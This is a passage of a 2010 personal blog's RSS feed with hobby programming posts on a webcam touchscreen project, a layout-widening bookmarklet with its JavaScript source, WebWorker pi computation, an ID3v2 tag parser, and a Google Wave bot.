      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/ShinyTouchOpenCV/ShinyTouch_0171.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/ShinyTouchOpenCV/ShinyTouch_0171.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;ShinyTouch_017&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I have yet to give up entirely on &lt;a href=&quot;http://antimatter15.com/2010/07/shinytouch-opencv/2009/07/shinytouch-zero-setup-single-touch-surface-retrofitting-technology/&quot;&gt;ShinyTouch&lt;/a&gt;, my experiment into creating a touch screen input system which requires &lt;strong&gt;virtually no setup&lt;/strong&gt;. For people who haven’t read my posts from last year, it works because magically things look shinier when you look at it from an angle. And so if you mount a camera at an angle (It doesn’t need to be as extreme as the screenshot above), you end up seeing a reflection on the surface of the screen (this could be aided by a transparent layer of acrylic or by having a glossy display, but as you can see, mine are matte, but they still work). The other pretty obvious idea of ShinyTouch, is that on a reflective surface, especially observed from a non-direct angle, you can see that the distance from the reflection (I guess my eighth grade science teacher would say the “virtual image”) to the apparent finger, or “real image” is twice the distance from either to the surface of the display.  In other words, the &lt;strong&gt;reflection gets closer to you when you get closer to the mirror&lt;/strong&gt;. A webcam usually gives a two-dimensional bitmap of data (and one non-spatial dimension of time). This gives (after a perspective transform) the &lt;strong&gt;X and Y positions&lt;/strong&gt; of the finger. But an important aspect of a touchscreen and what this technology is also capable of, a “zero-touch screen”, is a &lt;strong&gt;Z axis: the distance of the finger and the screen&lt;/strong&gt;. A touchscreen has a binary Z-axis: touch or no touch. Since you can measure the &lt;strong&gt;distance between the apparent real finger and it’s reflection, you can get the Z-axis&lt;/strong&gt;. That’s how ShinyTouch works.&lt;/p&gt;
&lt;p&gt;Last year someone was interested and actually contributed some code. Eventually we both agreed that my code was crap so he decided to &lt;a href=&quot;http://github.com/ddlshack/shinytouch&quot;&gt;rewrite&lt;/a&gt; it, this time using less PIL and pixel manipulation, and instead, opting for more OpenCV so it’s faster. The project died a bit early this year, and with nothing more to do,&lt;a href=&quot;http://github.com/antimatter15/shinytouch&quot;&gt; I decided to revive it&lt;/a&gt;. His code had some neat features:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Better perspective performs&lt;/li&gt;
&lt;li&gt;Faster&lt;/li&gt;
&lt;li&gt;Less Buggy&lt;/li&gt;
&lt;li&gt;Simpler configuration (track bars instead of key combinations and editing JSON files)&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Yellow square to indicate which corner to click when callibrating (actually, &lt;a href=&quot;http://github.com/ddlshack/shinytouch/commit/9df521a08c8a12e6b8d1aa58d665394faaaac10f&quot;&gt;I wrote&lt;/a&gt; that feature)
It was left however, at a pretty unfinished state. It couldn’t do anything more than generate config files through a nice UI and doing a perspective transform on the raw video feed. So in the last few days, I added a few more features.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Convert perspective-transformed code into grayscale&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;Apply a 6x6 gaussian blur filter&lt;/li&gt;
&lt;li&gt;Apply a binary threshold filter&lt;/li&gt;
&lt;li&gt;Copy it over to PIL and shrink the canvas by 75% for performance reasons&lt;/li&gt;
&lt;li&gt;Hack a Python flood-fill function to do blob detection (because I couldn’t compile any python bindings for the opencv blob library)&lt;/li&gt;
&lt;li&gt;Filter those blobs (sort of)
Basically, it means ShinyTouch can now do multi-touch. Though the Z-axis processing, which is really what the project is all about still sucks. Like it sucks &lt;em&gt;a lot&lt;/em&gt;. But when it does work (on a rare occasion), &lt;strong&gt;you get multitouch&lt;/strong&gt; (yay). If TUIO gets ported (again), it’ll probably be able to interface with all the neat TUIO based apps.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Code here: &lt;a href=&quot;http://github.com/antimatter15/shinytouch/&quot;&gt;http://github.com/antimatter15/shinytouch/&lt;/a&gt; Please help, you probably don’t want to try it (yet).&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Fluidizer fixed width → fluid width bookmarklet</title>
      <link>http://antimatter15.com/2010/07/fluidizer-fixed-width-fluid-width-bookmarklet/</link>
      <pubDate>Wed, 14 Jul 2010 04:59:48 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/07/fluidizer-fixed-width-fluid-width-bookmarklet/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/Fluidizer%20fixed%20width%20→%20fluid%20width%20bookmarklet/Selection_014.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Fluidizer%20fixed%20width%20→%20fluid%20width%20bookmarklet/Selection_014-300x204.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Fluidizered&lt;/div&gt;&lt;/div&gt;&lt;/a&gt; Yaay, fluid width!&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2010/Fluidizer%20fixed%20width%20→%20fluid%20width%20bookmarklet/Selection_013.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Fluidizer%20fixed%20width%20→%20fluid%20width%20bookmarklet/Selection_013-300x204.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Fixed Width&lt;/div&gt;&lt;/div&gt;&lt;/a&gt; I IZ NOM NOMMING ON HALF UR PIXELZ&lt;/p&gt;
&lt;p&gt;This is another old one, something I made february fifteenth of this year.&lt;/p&gt;
&lt;p&gt;One of the purely theoretical things that have always annoyed me, were fixed width themes. Because I &lt;em&gt;love&lt;/em&gt; being a hypocrite, this blog right now is using a&lt;a href=&quot;http://blog.carringtontheme.com/&quot;&gt; fixed width theme&lt;/a&gt;. Though I probably could make up an excuse, like to serve as a decent test case for Fluidizer in part of my grand scheme detailed via embedded &lt;a href=&quot;http://antimatter15.com/2010/07/fluidizer-fixed-width-fluid-width-bookmarklet/2010/06/steganography-in-javascript/&quot;&gt;steganographic&lt;/a&gt; messages inside all of my screenshots. Of course that’s all a lie (however much I would like otherwise).&lt;/p&gt;
&lt;p&gt;It’s always bothered me how some web sites have these fixed-width layouts, sometimes with insanely thin boxes allocated to content. The vast majority of my screen becomes this orange blob of text. Chrome’s visual appearance motto is “Content not chrome”. That doesn’t help if the content is being obscured by the presentation of the content (&lt;a href=&quot;http://en.wikipedia.org/wiki/Gopher_(protocol&quot;&gt;gopher&lt;/a&gt;) might have solved that problem). Less chrome just means my eyes start to drown in +/- 1,732,405 pixels of orange. Even outside the extreme case, having a fixed-width layout isn’t efficient, and using something like &lt;a href=&quot;http://lab.arc90.com/experiments/readability/&quot;&gt;Readability&lt;/a&gt; to &lt;em&gt;only&lt;/em&gt; show the content removes the personality of the site or author, and only works on articles.&lt;/p&gt;
&lt;p&gt;Fluidizer automatically resizes themes semi-pseudo-intelligently, and works with a lot of themes. It has several algorithms it uses, which are sort of alchemy-like and strange. I have no clue how it works, but there’s lots of strange stuff that goes on to magically do stuff. I think it even somehow has a CSS parser that uses CORS to load css through a server-side proxy.&lt;/p&gt;
&lt;p&gt;Only tested in Chrome: [Fluidize]&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='haxe'&gt;&lt;/span&gt;javascript:(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(a)&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt;(a||&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;).replace(/^\s+|\s+$/g,&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;)}&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(a,g)&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; b=&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; XMLHttpRequest;b.open(&lt;span class=&quot;hljs-string&quot;&gt;&quot;GET&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://anti15.chemicalservers.com/cssproxy.php?cssurl=&quot;&lt;/span&gt;+encodeURIComponent(a),&lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;);b.onreadystatechange=&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{b.readyState==&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;&amp;amp;&amp;amp;b.status==&lt;span class=&quot;hljs-number&quot;&gt;200&lt;/span&gt;&amp;amp;&amp;amp;g(b.responseText)};b.send()}&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; a=&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;,g=&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;,b=&lt;span class=&quot;hljs-literal&quot;&gt;false&lt;/span&gt;,h=&lt;span class=&quot;hljs-string&quot;&gt;&quot;*,div,p,body,span&quot;&lt;/span&gt;.split(&lt;span class=&quot;hljs-string&quot;&gt;&quot;,&quot;&lt;/span&gt;);!b&amp;amp;&amp;amp;g++&amp;lt;&lt;span class=&quot;hljs-number&quot;&gt;20&lt;/span&gt;;){&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(document.body.scrollWidth&amp;gt;window.innerWidth){b=&lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;;a-=&lt;span class=&quot;hljs-number&quot;&gt;100&lt;/span&gt;}&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; a+=&lt;span class=&quot;hljs-number&quot;&gt;100&lt;/span&gt;;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; c=d.length;c--;){&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; f=d[c].text;&lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; i=document.querySelectorAll(f),l=i.length;l--;){&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; n=i[l],p=parseFloat(d[c].width,&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;),q=d[c].width.replace(/^[\-\d\.]+/,&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;);&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(q!=&lt;span class=&quot;hljs-string&quot;&gt;&quot;px&quot;&lt;/span&gt;)&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(q==&lt;span class=&quot;hljs-string&quot;&gt;&quot;em&quot;&lt;/span&gt;)p*=&lt;span class=&quot;hljs-number&quot;&gt;16&lt;/span&gt;;&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; console.warn(&lt;span class=&quot;hljs-string&quot;&gt;&quot;not used to handling non-px units&quot;&lt;/span&gt;);&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(p&amp;gt;&lt;span class=&quot;hljs-number&quot;&gt;400&lt;/span&gt;&amp;amp;&amp;amp;h.indexOf(f)==-&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;){&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(!n.a)n.a=p;n.style.width=n.a+a+&lt;span class=&quot;hljs-string&quot;&gt;&quot;px&quot;&lt;/span&gt;}}}&lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt;(x){}}}&lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt;{c=d.length;a=&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; r;c--;)&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(h.indexOf(d[c].text)==-&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;)&lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; j=document.querySelectorAll(d[c].text);&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(j.length==&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;&amp;amp;&amp;amp;j[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;].getElementsByTagName(&lt;span class=&quot;hljs-string&quot;&gt;&quot;*&quot;&lt;/span&gt;).length&amp;gt;&lt;span class=&quot;hljs-number&quot;&gt;15&lt;/span&gt;&amp;amp;&amp;amp;(j[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;]==document.body||j[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;].parentNode==document.body||j[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;].parentNode.parentNode==document.body))&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(parseInt(d[c].width,&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;)&amp;gt;a){a=parseInt(d[c].width,&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;);r=j[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;]}}&lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt;(y){}&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(a&amp;gt;&lt;span class=&quot;hljs-number&quot;&gt;500&lt;/span&gt;)r.style.width=&lt;span class=&quot;hljs-string&quot;&gt;&quot;100%&quot;&lt;/span&gt;}&lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt;(z){}}&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(a)&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; i=h.split(&lt;span class=&quot;hljs-string&quot;&gt;&quot;;&quot;&lt;/span&gt;).map(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(l)&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(k(l.split(&lt;span class=&quot;hljs-string&quot;&gt;&quot;:&quot;&lt;/span&gt;)[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;])==&lt;span class=&quot;hljs-string&quot;&gt;&quot;width&quot;&lt;/span&gt;)&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; k(l.split(&lt;span class=&quot;hljs-string&quot;&gt;&quot;:&quot;&lt;/span&gt;)[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;]);&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;}).join(&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;);b&amp;amp;&amp;amp;k(b)&amp;amp;&amp;amp;i&amp;amp;&amp;amp;k(i)&amp;amp;&amp;amp;d.push({text:k(b),width:i});h=b=&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;}&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; b=&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;,h=&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;,c=&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;,f=&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;;f&amp;lt;a.length;f++)&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(a[f]==&lt;span class=&quot;hljs-string&quot;&gt;&quot;{&quot;&lt;/span&gt;)c=&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;;&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(a[f]==&lt;span class=&quot;hljs-string&quot;&gt;&quot;}&quot;&lt;/span&gt;){g();c=&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;}&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(c==&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;)b+=a[f];&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(c==&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;)h+=a[f];g();o()}&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; d=[],s=document.styleSheets,t=s.length;t--;){&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; e=s[t];&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(e.href&amp;amp;&amp;amp;!e.cssRules){console.log(e.href);u(e.href,v)}&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;{e=e.cssRules;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; m=e.length;m--;){&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; w=e[m].selectorText;e[m].style&amp;amp;&amp;amp;e[m].style.width&amp;amp;&amp;amp;d.push({text:w,width:e[m].style.width})}}}window.addEventListener(&lt;span class=&quot;hljs-string&quot;&gt;&quot;resize&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{setTimeout(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{o()},&lt;span class=&quot;hljs-number&quot;&gt;100&lt;/span&gt;)});o()})();
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Multicore Javascript Pi Computing with WebWorkers</title>
      <link>http://antimatter15.com/2010/07/multicore-javascript-pi-computing-with-webworkers/</link>
      <pubDate>Wed, 14 Jul 2010 03:27:39 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/07/multicore-javascript-pi-computing-with-webworkers/</guid>
      <author></author>
      <description>&lt;div&gt;

&lt;a href=&quot;/articles/2010/Multicore%20Javascript%20Pi%20Computing%20with%20WebWorkers/Selection_012.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Multicore%20Javascript%20Pi%20Computing%20with%20WebWorkers/Selection_012.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Selection_012&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;a href=&quot;http://antimatter15.github.com/pi/partial.html&quot;&gt;
http://antimatter15.github.com/pi/partial.html&lt;/a&gt;

It’s not using the fastest algorithm, but the nice thing about this one is that it’s capable of digit-extraction (calculating one section without knowing the digits before it) and was nice for doing&lt;a href=&quot;http://antimatter15.com/2010/07/multicore-javascript-pi-computing-with-webworkers/2008/12/distributed-computing-take-iii/&quot;&gt; distributed computin&lt;/a&gt;g. This also has the nice side effect of working pretty well with the MapReduce paradigm (To calculate a block, calculate primes 3 to 2*N, map it all to the magical pi algorithm and then add it all up and truncate the &lt;a href=&quot;http://mathworld.wolfram.com/FractionalPart.html&quot;&gt;fractional part&lt;/a&gt;, however it doesn’t really use MapReduce because there aren’t enough machines/threads to make it really necessary to distribute out the reducing part). So on the time-memory tradeoff scale, this algorithm uses low memory and is slower, which makes it pretty good for the purposes of something implemented with WebWorkers as I can’t imagine it would be good to have the same data multiplied by the number of threads and having lots of data being passed with each postMessage.

&lt;/div&gt;
</description>
    </item>
    <item>
      <title>A Bright Coloured Fish Parsing ID3v2 Tags in Javascript (and ExtensionFM)</title>
      <link>http://antimatter15.com/2010/07/a-bright-coloured-fish-parsing-id3v2-tags-in-javascript-and-extensionfm/</link>
      <pubDate>Fri, 09 Jul 2010 22:34:31 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/07/a-bright-coloured-fish-parsing-id3v2-tags-in-javascript-and-extensionfm/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/A%20Bright%20Coloured%20Fish%20Parsing%20ID3v2%20Tags%20in%20Javascript%20(and%20ExtensionFM)/250px-Ocellaris_clownfish.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/A%20Bright%20Coloured%20Fish%20Parsing%20ID3v2%20Tags%20in%20Javascript%20(and%20ExtensionFM)/250px-Ocellaris_clownfish.jpg&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Stolen from wikipedia&lt;/div&gt;&lt;/div&gt;&lt;/a&gt; Stolen from wikipedia&lt;/p&gt;
&lt;p&gt;After having fun reinstalling &lt;a href=&quot;http://www.ubuntu.com/desktop&quot;&gt;Ubuntu&lt;/a&gt;, only to get extremely bored by the newfound stability and familiarity of 10.04, I upgraded to the &lt;a href=&quot;http://www.ubuntu.com/testing/maverick/alpha2&quot;&gt;Maverick Meerkat&lt;/a&gt;, where I was greeted by a &lt;a href=&quot;http://www.google.com/search?q=grub_xputs+symbol+not+found&amp;amp;qscrl=1&quot;&gt;friendly GRUB error&lt;/a&gt;. After consulting the Live CD a few times, I got into a normal desktop. Then I proceeded to install the two apps I ever use which aren’t included in Ubuntu: &lt;a href=&quot;http://www.chromium.org/&quot;&gt;Chromium&lt;/a&gt; and &lt;a href=&quot;http://shutter-project.org&quot;&gt;Shutter&lt;/a&gt; (Maybe you could include &lt;a href=&quot;http://git-scm.com/&quot;&gt;git&lt;/a&gt; as well). After a bit of dismay as it seems Chromium &lt;em&gt;didn’t&lt;/em&gt; sync extensions as advertised,  I proceeded to reinstall my extensions. At least the issue where I couldn’t delete bookmarks was resolved.&lt;/p&gt;
&lt;p&gt;It was also a neat opportunity to try out some new things, one of them was &lt;a href=&quot;https://chrome.google.com/extensions/detail/nnancliccjabjjmipbpjkfbijifaainp&quot;&gt;Neat Bookmarks&lt;/a&gt; after finding out that —bookmark-menu didn’t work (I only found it ever existed when it was announced that it was removed, though), which has a far prettier icon than some other bookmarks menu addon I had previously.&lt;/p&gt;
&lt;p&gt;Another extension I tried out was &lt;a href=&quot;https://chrome.google.com/extensions/detail/ehohhddamheegbbkabfgegbaeminghlb&quot;&gt;Extension.FM&lt;/a&gt;. I’ve heard of it a while ago, but I never actually installed it for some reason, and there was a&lt;a href=&quot;http://ajaxian.com/archives/extensionfm-a-case-study-on-a-sexy-app-turn-extension&quot;&gt; post on Ajaxian&lt;/a&gt; on it recently so I decided to try it out. The interface was neat (I knew that beforehand). I have an interesting (maybe not so much), system for storing my music on a local networked server (in my basement). So I went to it’s apache URL and browsed to the file location. ExtensionFM loaded it all and stuck it into my library (as advertised), but all the cover art, song name, album name and artist information was missing! Oh noes! Obviously it was missing&lt;a href=&quot;http://en.wikipedia.org/wiki/ID3&quot;&gt; ID3 data&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The great thing about Chrome, Firefox and Greasemonkey extensions, is that the source code is practically open to anyone who uses it. View source or otherwise, you can always get at it and hack stuff to make things right (ignoring the legal implications that ruin innovation). Some people think that there needs to be more done to secure the author’s source code from the user’s prying eyes, but that could not be further from the case. Hopefully this will be a case for why the source code should be exposed to the user.&lt;/p&gt;
&lt;p&gt;So, after finding the location, which wasn’t the easiest thing as Chrome gives them these folder names based on a random generated public key which gives &lt;em&gt;no&lt;/em&gt; hint on what the contents are. But as I only had a few plugins, getting ~/.config/chromium/Default/Extensions/ehohhddamheegbbkabfgegbaeminghlb/1.4.9_0/js wasn’t too hard. I found sound-parser.js and looked a little into it, and lo and behold, no ID3 parsing!&lt;/p&gt;
&lt;p&gt;That’s probably expected as ID3v2 is a binary format, and JS was never that great at handling binary. I knew that there was an &lt;a href=&quot;http://nihilogic.dk/labs/id3/&quot;&gt;ID3v1 parser&lt;/a&gt;. But I wasn’t aware of an ID3v2 parser at the time, it seems that&lt;a href=&quot;http://github.com/aadsm/JavaScript-ID3-Reader&quot;&gt; there is one&lt;/a&gt; that a quick google search would have saved me hours yesterday. So after &lt;a href=&quot;http://www.id3.org/id3v2.4.0-frames&quot;&gt;implementing the spec&lt;/a&gt;, and googling several times why Picture Type $11 is “A bright coloured fish”, I hacked it onto song-parser.js and through&lt;a href=&quot;http://support.extension.fm/forums/59119-product-ideas/suggestions/897137-id3v2-data-patch&quot;&gt; means detailed here&lt;/a&gt;, I got ID3v2 support in ExtensionFM. So yay, now what was missing: cover art, album name, song title and artist now all work :)&lt;/p&gt;
&lt;p&gt;Anyway, the project for the ID3v2 parser (mine, the one you &lt;em&gt;shouldn’t&lt;/em&gt; use), is on github at &lt;a href=&quot;http://github.com/antimatter15/js-id3v2&quot;&gt;http://github.com/antimatter15/js-id3v2&lt;/a&gt;. If you want a neat little online demo, just go to the URL below. I wouldn’t suggest any browser other than the Chromium nightlies or possibly Firefox 4.0 to view it as it relies on multi-file input and FileReader. Basically, this is how you use it: Press &amp;lt;Browse&amp;gt; and multi-select all the music that you have, and automagically, it reads it and parses ID3v2 data (all locally, mind you, so your secret collection of pirated music is not going to be sent to me for forwarding to the RIAA of your jurisdiction). It’s then shown at a 5 second slideshow. Cover art (if not present in the song) is of a probably copyright-infringing image of a sad fish that google referred me to because of this interesting fish theme.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/js-id3v2/id3v2.html&quot;&gt;http://antimatter15.com/misc/js-id3v2/id3v2.html&lt;/a&gt; &amp;lt;— Live Demo, you probably want to click it if you tl;dr’d this whole post.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Anony-bot</title>
      <link>http://antimatter15.com/2010/06/anony-bot/</link>
      <pubDate>Wed, 30 Jun 2010 03:23:53 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/06/anony-bot/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/Anony-bot/Anonybot-Chromium_082.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Anony-bot/Anonybot-Chromium_082.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Anonybot - Chromium_082&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;A little robot using the Robots V2 API to expose a wave to a URL. If the URL is shared, then anyone can post anonymously on the wave.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>μwave</title>
      <link>http://antimatter15.com/2010/06/mwave/</link>
      <pubDate>Wed, 30 Jun 2010 03:20:53 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/06/mwave/</guid>
      <author></author>
      <description>&lt;div&gt;

